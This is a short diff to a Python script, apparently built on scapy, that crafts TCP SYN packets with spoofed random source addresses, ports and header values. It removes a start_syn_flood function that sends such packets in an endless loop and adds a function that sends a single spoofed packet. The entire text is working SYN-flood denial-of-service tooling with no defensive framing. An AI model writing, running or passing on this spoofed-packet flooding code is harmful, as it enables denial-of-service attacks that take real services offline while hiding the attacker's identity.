@@ -13,10 +13,6 @@ def build_syn_packet(destination_ip, destination_port):
     """
     return IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/TCP(sport=RandShort(), dport=destination_port, ack=RandShort(), window=RandShort(), flags="S")
 
-def start_syn_flood(destination_ip, destination_port):
-    """Continuously send TCP SYN requests"""
-    try:
-        while True:
-            send(build_syn_packet(destination_ip, destination_port), inter=packet_builder.generate_delay())
-    except KeyboardInterrupt:
-        print("...Exiting...")
+def send_syn_packet(destination_ip, destination_port):
+    """Send TCP SYN packet"""
+    send(build_syn_packet(destination_ip, destination_port), inter=packet_builder.generate_delay())
